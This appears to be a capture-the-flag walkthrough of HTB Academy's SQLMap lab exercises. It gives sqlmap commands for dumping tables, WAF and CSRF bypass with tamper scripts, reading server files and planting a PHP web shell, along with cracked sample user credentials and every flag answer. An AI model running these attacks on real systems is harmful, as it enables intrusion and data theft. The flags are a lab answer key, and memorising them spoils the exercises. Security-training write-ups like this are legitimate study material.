@@ -1,0 +1,615 @@
+[Running SQLMap on an HTTP Request]
+
+[*] Target: 68.183.47.54:30793
+
+[Question 1] What's the contents of table flag2? (Case #2)
+
+    -   Go to http://68.183.47.54:30793/case2.php then click on the "Submit" button: 
+
+        POST /case2.php HTTP/1.1
+        Host: 68.183.47.54:30793
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Origin: http://68.183.47.54:30793
+        Connection: close
+        Referer: http://68.183.47.54:30793/case2.php
+        Upgrade-Insecure-Requests: 1
+
+        id=1
+
+    # sqlmap -u 'http://68.183.47.54:30793/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'id=1*' -T flag2 --dump --method POST
+
+        [?] -T: used to specify the database table to target
+
+        [?] --dump: used to retrieve and display the contents of the specified database table
+
+        ...
+        [23:52:45] [INFO] fetching entries for table 'flag2' in database 'testdb'
+        Database: testdb
+        Table: flag2
+        [1 entry]
+        +----+----------------------------------------+
+        | id | content                                |
+        +----+----------------------------------------+
+        | 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+        +----+----------------------------------------+
+
+    [!] Answer: "HTB{700_much_c0n6r475_0n_p057_r3qu357}"
+
+[Question 2] What's the contents of table flag3? (Case #3)
+
+    -   Go to http://68.183.47.54:30793/case3.php then click on the "click here" button: 
+
+        GET /case3.php HTTP/1.1
+        Host: 68.183.47.54:30793
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://68.183.47.54:30793/case3.php
+        Cookie: id=1
+        Upgrade-Insecure-Requests: 1
+
+    # sqlmap -u "http://68.183.47.54:30793/case3.php" --cookie 'id=1*' -T flag3 --dump
+
+        ...
+        [01:19:42] [INFO] fetching entries for table 'flag3' in database 'testdb'
+        Database: testdb
+        Table: flag3
+        [1 entry]
+        +----+------------------------------------------+
+        | id | content                                  |
+        +----+------------------------------------------+
+        | 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+        +----+------------------------------------------+
+
+    [!] Answer: "HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}"
+
+[Question 3] What's the contents of table flag4? (Case #4)
+
+    -   Go to http://68.183.47.54:30793/case4.php
+
+            POST /case4.php HTTP/1.1
+            Host: 68.183.47.54:30793
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/json
+            Content-Length: 8
+            Origin: http://68.183.47.54:30793
+            Connection: close
+            Referer: http://68.183.47.54:30793/case4.php
+
+            {"id":1}  
+
+    # sqlmap -u 'http://68.183.47.54:30793/case4.php' -H 'Content-Type: application/json' --data '{"id":1}' -T flag4 --dump --method POST
+
+        ...
+        [01:59:23] [INFO] fetching entries for table 'flag4' in database 'testdb'
+        Database: testdb
+        Table: flag4
+        [1 entry]
+        +----+---------------------------------+
+        | id | content                         |
+        +----+---------------------------------+
+        | 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+        +----+---------------------------------+
+
+    [!] Answer: "HTB{j450n_v00rh335_53nd5_6r475}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Attack Tuning]
+
+[*]  Target: 144.126.192.42:31679
+
+[Question 1]  What's the contents of table flag5? (Case #5)
+
+    # sqlmap -u 'http://144.126.192.42:31679/case5.php?id=1' --level=5 --risk=3 --dump -T flag5
+
+    [?] --level: Specifies the level of tests to be performed during the SQL injection detection. It ranges from 1 to 5, with 1 being the least aggressive and 5 being the most aggressive.
+
+    [?] --risk: Determines the level of risk assumed by sqlmap during the vulnerability detection process. It ranges from 1 to 3, with 1 being the lowest risk level and 3 being the highest.
+
+        ...
+        [08:35:14] [INFO] retrieved: 1
+        Database: testdb
+        Table: flag5
+        [1 entry]
+        +----+---------------------------------+
+        | id | content                         |
+        +----+---------------------------------+
+        | 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+        +----+---------------------------------+
+
+    [!] Answer: "HTB{700_much_r15k_bu7_w0r7h_17}"
+
+[Question 2] What's the contents of table flag6? (Case #6)
+
+    [?] Hint: Use --prefix='`)'
+
+    -   Go to http://68.183.47.54:30793/case3.php then click on the "click here" button: 
+
+        GET /case6.php?col=id HTTP/1.1
+        Host: 144.126.192.42:31679
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://144.126.192.42:31679/case6.php
+        Upgrade-Insecure-Requests: 1
+
+    # sqlmap -u 'http://144.126.192.42:31679/case6.php?col=id' --level=3 --risk=3 --dump -T flag6 --technique=BEU --prefix='`)'
+
+        [10:00:10] [INFO] retrieved: 1
+        Database: testdb
+        Table: flag6
+        [1 entry]
+        +----+----------------------------------+
+        | id | content                          |
+        +----+----------------------------------+
+        | 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+        +----+----------------------------------+
+
+    [!] Answer: "HTB{v1nc3_mcm4h0n_15_4570n15h3d}"
+
+[Question 3] What's the contents of table flag7? (Case #7)
+
+    [?] Hint: Try to count the number of columns in the page output, and specify them for sqlmap.
+
+    # sqlmap -u 'http://144.126.192.42:31679/case7.php?id=1' --union-cols 5-8 --level=3 --risk=3 --dump -T flag7 --technique=U -D testdb
+
+        [10:22:54] [INFO] fetching entries for table 'flag7' in database 'testdb'
+        Database: testdb
+        Table: flag7
+        [1 entry]
+        +----+-----------------------+
+        | id | content               |
+        +----+-----------------------+
+        | 1  | HTB{un173_7h3_un173d} |
+        +----+-----------------------+
+
+    [!] Answer: 'HTB{un173_7h3_un173d}'
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Database Enumeration]
+
+[*] Target: 144.126.192.42:30510
+
+[Question 1] What's the contents of table flag1 in the testdb database? (Case #1)
+
+    [?] Hint: To be more efficient, try to specify the database and table name for sqlmap.
+
+    [Step 1] Gather information about the database
+
+    # sqlmap -u 'http://144.126.192.42:30510/case1.php?id=1' --level=3 --risk=3 --banner --current-user --current-db --is-dba
+
+        [?] --banner: Retrieves the DBMS banner, which provides information about the database management system being used.
+
+        [?] --current-user: Retrieves the username of the current database user.
+
+        [?] --current-db: Retrieves the name of the current database.
+
+        [?] --is-dba: Checks whether the current user has DBA (Database Administrator) privileges.
+
+        ...
+        web server operating system: Linux Debian 10 (buster)
+        web application technology: Apache 2.4.38
+        back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+        banner: '10.3.23-MariaDB-0+deb10u1'
+        [06:05:33] [INFO] fetching current user
+        current user: 'user1@localhost'
+        [06:05:34] [INFO] fetching current database
+        current database: 'testdb'
+        [06:05:34] [INFO] testing if current user is DBA
+        [06:05:34] [INFO] fetching current user
+        [06:05:35] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+        current user is DBA: False
+        [06:05:35] [INFO] fetched data logged to text files under '/home/bigbox/.local/share/sqlmap/output/144.126.192.42'        
+
+        => current database: 'testdb'
+
+    [Step 2] Gather information about the tables     
+
+    # sqlmap -u 'http://144.126.192.42:30510/case1.php?id=1' --level=3 --risk=3 --tables -D testdb --dump
+        ...
+        [06:08:14] [WARNING] potential permission problems detected ('command denied')
+        Database: testdb
+        [2 tables]
+        +-------+
+        | flag1 |
+        | users |
+        +-------+
+        ...
+        [06:12:04] [INFO] fetching entries for table 'flag1' in database 'testdb'
+        Database: testdb
+        Table: flag1
+        [1 entry]
+        +----+-----------------------------------------------------+
+        | id | content                                             |
+        +----+-----------------------------------------------------+
+        | 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+        +----+-----------------------------------------------------+
+        ...
+        [06:12:05] [INFO] recognized possible password hashes in column 'password'
+        do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+        do you want to crack them via a dictionary-based attack? [Y/n/q] n
+        Database: testdb
+        Table: users
+        [32 entries]
+        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+------------------------------------------+---------------------------------------------------+
+        | id | cc               | name              | email                       | phone        | address                | birthday          | password                                 | occupation                                        |
+        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+------------------------------------------+---------------------------------------------------+
+        | 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 | Linemen                                           |
+        | 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219 | Agricultural product sorter                       |
+        ...
+
+    [!] Answer: "HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Advanced Database Enumeration]
+
+[*] Target: 167.99.85.143:31356
+
+[Question 1] What's the name of the column containing "style" in it's name? (Case #1)
+
+    # sqlmap -u 'http://167.99.85.143:31356/case1.php?id=1' --level=3 --risk=3 --dbs --tables --search -C style
+
+    [?] --search -C style:  search for columns with the name LIKE "style" 
+
+    [?] --dbs: search for all databases in the target
+
+    Database: information_schema
+    [76 tables]
+    +---------------------------------------+
+    | ALL_PLUGINS                           |
+    | APPLICABLE_ROLES                      |
+    | CHARACTER_SETS                        |
+    | CHECK_CONSTRAINTS                     |
+    | CLIENT_STATISTICS                     |
+
+    |            ....                       |
+
+    | TABLE_STATISTICS                      |
+    | TRIGGERS                              |
+    | USER_PRIVILEGES                       |
+    | USER_STATISTICS                       |
+    | VIEWS                                 |
+    | user_variables                        |
+    +---------------------------------------+
+
+    Database: testdb
+    [2 tables]
+    +---------------------------------------+
+    | flag1                                 |
+    | users                                 |
+    +---------------------------------------+
+    ...
+    [06:46:48] [INFO] fetching columns LIKE 'style' for table 'ROUTINES' in database 'information_schema'                                                                           
+    columns LIKE 'style' were found in the following databases:
+    Database: information_schema
+    Table: ROUTINES
+    [1 column]
+    +-----------------+------------+
+    | Column          | Type       |
+    +-----------------+------------+
+    | PARAMETER_STYLE | varchar(8) |
+    +-----------------+------------+
+
+    [!] Asnwer: "PARAMETER_STYLE"
+
+[Question 2] What's the Kimberly user's password? (Case #1)
+
+    # sqlmap -u 'http://167.99.85.143:31356/case1.php?id=1' --level=3 --risk=3 --dump -T users -D testdb
+
+        do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+        do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+        [07:00:54] [INFO] using hash method 'sha1_generic_passwd'
+        what dictionary do you want to use?
+        [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+        [2] custom dictionary file
+        [3] file with list of dictionary files
+        > 1
+        [07:01:00] [INFO] using default dictionary
+        do you want to use common password suffixes? (slow!) [y/N] N
+        [07:01:08] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
+        [07:01:08] [INFO] starting 6 processes 
+        [07:01:08] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                               
+        [07:01:08] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                               
+        [07:01:08] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'                                                                               
+                    ....                                                         
+        [07:01:10] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'                                                                               
+        [07:01:10] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'                                                                             
+        [07:01:10] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'                                                                               
+        [07:01:11] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'                                                                               
+        Database: testdb                                                                       
+        Table: users
+        [32 entries]
+        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+        | id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
+        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+        | 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
+        | 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
+        | 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
+        | 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
+        | 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
+        | 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
+        | 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
+                                                                            .....
+        | 30 | 4556109704569770 | Dennis Snow       | DennisDSnow@yahoo.com       | 715-730-1951 | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
+        | 31 | 5554945940459873 | Loren Bunch       | LorenSBunch@gmail.com       | 805-766-2963 | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
+        | 32 | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+        +----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+
+    [!] Answer: "Enizoom1609"
+
+
+************************************************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[Bypassing Web Application Protections]
+
+[*] Target: 206.189.29.104:31525
+
+[Question 1] What's the contents of table flag8? (Case #8)
+
+    -   Go to http://206.189.29.104:31525/case8.php then click on the "Submit" button:
+
+    # sqlmap -u 'http://206.189.29.104:31525/case8.php' --method POST --data 'id=1&t0ken=giSW7Qhdflg92TKzcWJ3tyXMsxm6j3dag8I4xCayDrI' -H 'Content-Type: application/x-www-form-urlencoded' --level=3 --risk=3 --csrf-token='t0ken' --skip-waf -H 'Cookie: PHPSESSID=hq4av1m045jav0suq0j8hifv7q' -T flag8 --dump
+
+        [?] --csrf-token='t0ken': Specifies the name of the anti-CSRF token parameter, which is set to "t0ken" in this case. (cookie + token = anti CSRF => this flag regex the session to find token)
+
+        [?] --skip-waf: Instructs SQLMap to skip the detection and evasion of Web Application Firewalls (WAFs) during the scanning process.
+
+            POST /case8.php HTTP/1.1
+            Host: 206.189.29.104:31525
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 54
+            Origin: http://206.189.29.104:31525
+            Connection: close
+            Referer: http://206.189.29.104:31525/case8.php
+            Cookie: PHPSESSID=hq4av1m045jav0suq0j8hifv7q
+            Upgrade-Insecure-Requests: 1
+
+            id=1&t0ken=ESBPmeeqRekDX0jFuPg4C3jlodw2Y6UKDnQXSM9X98A
+            ...
+            [23:43:26] [INFO] fetching entries for table 'flag8' in database 'testdb'
+            Database: testdb
+            Table: flag8
+            [1 entry]
+            +----+-----------------------------------+
+            | id | content                           |
+            +----+-----------------------------------+
+            | 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+            +----+-----------------------------------+
+
+    [!] Answer: "HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}"
+
+[Question 2] What's the contents of table flag9? (Case #9)
+
+    -   If you use the same uid for other request 
+
+        GET /case9.php?id=1&uid=4278815819 HTTP/1.1
+        Host: 206.189.29.104:31525
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        =>  HTTP/1.1 200 OK
+            Date: Mon, 22 May 2023 04:46:27 GMT
+            Server: Apache/2.4.38 (Debian)
+            Content-Length: 7
+            Connection: close
+            Content-Type: text/html; charset=UTF-8
+
+            Bad 
+
+    # sqlmap -u 'http://206.189.29.104:31525/case9.php?id=1*&uid=2150552906' -H 'Cookie: PHPSESSID=hq4av1m045jav0suq0j8hifv7q' --method POST --skip-waf -T flag9 --dump --tamper=0eunion,equaltolike --randomize=uid --level=3 --risk=3
+
+        Note: --csrf-token focuses on handling and bypassing anti-CSRF protection mechanisms by identifying and using CSRF token values,
+            
+            --randomize aims to evade caching mechanisms and detection by changing the parameter value for each request.
+
+        [?] --tamper=<options>:  used to specify tampering scripts to modify the payloads or behavior of SQLMap during the injection testing process
+
+            - In this case, I used 
+            
+                [+] 0eunion: This tampering script is used to inject 0e (zero-e) prefix before the payload value, which can help in bypassing certain types of filters or input validation mechanisms that may be expecting specific data formats
+
+                [+] equaltolike: This tampering script is used to replace the = operator with LIKE operator in the injected payloads
+
+        [01:05:52] [INFO] fetching entries for table 'flag9' in database 'testdb'               
+        Database: testdb
+        Table: flag9
+        [1 entry]
+        +----+---------------------------------------+
+        | id | content                               |
+        +----+---------------------------------------+
+        | 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
+        +----+---------------------------------------+
+
+    [!] Answer: "HTB{700_much_r4nd0mn355_f0r_my_74573}"
+
+[Question 3] What's the contents of table flag10? (Case #10)
+
+    -   Go to http://206.189.29.104:31525/case10.php then click on "Submit": 
+
+        POST /case10.php HTTP/1.1
+        Host: 206.189.29.104:31525
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Origin: http://206.189.29.104:31525
+        Connection: close
+        Referer: http://206.189.29.104:31525/case10.php
+        Upgrade-Insecure-Requests: 1
+
+        id=1
+
+    # sqlmap -u 'http://206.189.29.104:31525/case10.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'id=1' --method POST --skip-waf -T flag10 --dump --tamper=0eunion,equaltolike,space2comment --level=3 --risk=2 --random-agent
+
+    [?] --random-agent: The purpose of the --random-agent option in SQLMap is to add another layer of obfuscation to the tool's requests. 
+                        By randomizing the User-Agent, SQLMap attempts to make its requests appear more varied and similar to legitimate user traffic
+                        => Making it slightly more challenging for security systems to recognize and block SQLMap specifically.
+
+        [07:23:03] [INFO] fetching entries for table 'flag10' in database 'testdb'
+        Database: testdb
+        Table: flag10
+        [1 entry]
+        +----+----------------------------+
+        | id | content                    |
+        +----+----------------------------+
+        | 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+        +----+----------------------------+
+
+    [!] Answer: "HTB{y37_4n07h3r_r4nd0m1z3}"
+
+[Question 4]  What's the contents of table flag11? (Case #11)
+
+    - After submited the id => Case11 - Filtering of characters '<', '>'
+
+    # sqlmap -u 'http://206.189.29.104:31525/case11.php?id=1*' --skip-waf -T flag11 --dump --tamper=0eunion,equaltolike,space2comment,between --level=5 --risk=3
+
+        [?] between: Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
+            ...
+            [08:40:07] [INFO] retrieved: 1
+            Database: testdb
+            Table: flag11
+            [1 entry]
+            +----+----------------------------+
+            | id | content                    |
+            +----+----------------------------+
+            | 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+            +----+----------------------------+
+
+    [!] Answer: "HTB{5p3c14l_ch4r5_n0_m0r3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[OS Exploitation]
+
+[*] Target: 206.189.29.104:31095
+
+[Question 1] Try to use SQLMap to read the file "/var/www/html/flag.txt".
+
+    - Go to http://206.189.29.104:31095/ then click on "click here":
+
+        GET /?id=1 HTTP/1.1
+        Host: 206.189.29.104:31095
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://206.189.29.104:31095/
+        Upgrade-Insecure-Requests: 1
+
+    # sqlmap -u 'http://206.189.29.104:31095/?id=1' --level=3 --risk=3 --random-agent --skip-waf --tamper=between,0eunion,equaltolike,space2comment --technique=BEU --file-read "/var/www/html/flag.txt"
+
+        ...
+        [09:05:00] [INFO] the local file '/home/htb-ac-788964/.local/share/sqlmap/output/206.189.29.104/files/_var_www_html_flag.txt' and the remote file '/var/www/html/flag.txt' have the same size (31 B)
+        files saved to [1]:
+        [*] /home/htb-ac-788964/.local/share/sqlmap/output/206.189.29.104/files/_var_www_html_flag.txt (same file)
+
+    # cat /home/htb-ac-788964/.local/share/sqlmap/output/206.189.29.104/files/_var_www_html_flag.txt
+        HTB{5up3r_u53r5_4r3_p0w3rful!}
+
+    [!] Answer: "HTB{5up3r_u53r5_4r3_p0w3rful!}"
+
+[Question 2]  Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
+
+    [Step 1] Create a basic PHP payload
+
+        # echo '<?php system($_GET["cmd"]); ?>' > payload.php
+
+    [Step 2] Write "payload.php" into the target using sqlmap
+
+        # sqlmap -u 'http://206.189.29.104:31095/?id=1' --level=3 --risk=3 --random-agent --skip-waf --tamper=between,0eunion,equaltolike,space2comment --technique=BEU --file-write "payload.php" --file-dest "/var/www/html/payload.php"
+
+    [Step 3] Find and read the flag
+
+        http://206.189.29.104:31095/payload.php?cmd=find%20/%20-name%20flag.txt%202%3E/dev/null => /var/www/html/flag.txt and /flag.txt
+
+        http://206.189.29.104:31095/payload.php?cmd=cat%20/flag.txt => HTB{n3v3r_run_db_45_db4}
+
+    [!] Answer: "HTB{n3v3r_run_db_45_db4}"
+
+
+************************************************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment]
+
+[*] Target: 143.110.166.117:30204
+
+[Question 1] What's the contents of table final_flag?
+
+    - Go to http://143.110.166.117:30204/shop.html# then click on "ADD TO CART" (in this case I chose Nike Free RN 2020 ID): 
+
+        POST /action.php HTTP/1.1
+        Host: 143.110.166.117:30204
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        Content-Length: 8
+        Origin: http://143.110.166.117:30204
+        Connection: close
+        Referer: http://143.110.166.117:30204/shop.html
+
+        {"id":1}
+
+    # sqlmap -u 'http://143.110.166.117:32245/action.php' --data '{"id":1}' -H 'Content-Type: application/json' --method POST -T final_flag --dump --level=5 --risk=3 --random-agent --skip-waf --tamper=between,0eunion,equaltolike,space2comment
+
+        [11:59:24] [INFO] adjusting time delay to 1 second due to good response times
+        production
+        [11:59:57] [INFO] fetching columns for table 'final_flag' in database 'production'
+        [11:59:57] [INFO] retrieved: 2
+        [11:59:59] [INFO] retrieved: id
+        [12:00:06] [INFO] retrieved: content
+        [12:00:31] [INFO] fetching entries for table 'final_flag' in database 'production'
+        [12:00:31] [INFO] fetching number of entries for table 'final_flag' in database 'production'
+        [12:00:31] [INFO] retrieved: 1
+        [12:00:32] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                    
+        HTB{n07_50_h4rd_r16h7?!}
+        [12:02:01] [INFO] retrieved: 1
+        Database: production
+        Table: final_flag
+        [1 entry]
+        +----+--------------------------+
+        | id | content                  |
+        +----+--------------------------+
+        | 1  | HTB{n07_50_h4rd_r16h7?!} |
+        +----+--------------------------+
+
+    [!] Answer: "HTB{n07_50_h4rd_r16h7?!}"
+
+
